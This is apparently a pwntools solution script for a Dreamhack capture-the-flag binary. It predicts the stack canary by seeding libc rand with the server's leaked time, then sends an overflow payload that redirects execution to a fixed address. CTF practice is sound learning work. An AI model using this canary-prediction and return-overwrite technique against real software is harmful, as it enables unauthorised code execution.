#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL
from time import time
context.binary = exe = ELF('./prob_patched') 
libc = CDLL('./libc.so.6')
ld = ELF("./ld-linux-x86-64.so.2")
p = remote('host3.dreamhack.games',  14785)
input()
p.recvuntil(b'time: ')
current_time = int(p.recvline()[:-1])
print((current_time))
libc.srand(current_time)


canary = 0
for i in range(0,8):
    v1 = canary << 8
    test = libc.rand()
    test = test & 0xff
    canary = v1 | test
    print(hex(canary))

p.sendline(b'a'*16 +p64(canary) + p64(0)*2 + p64(0x0000000000401299))




p.interactive()
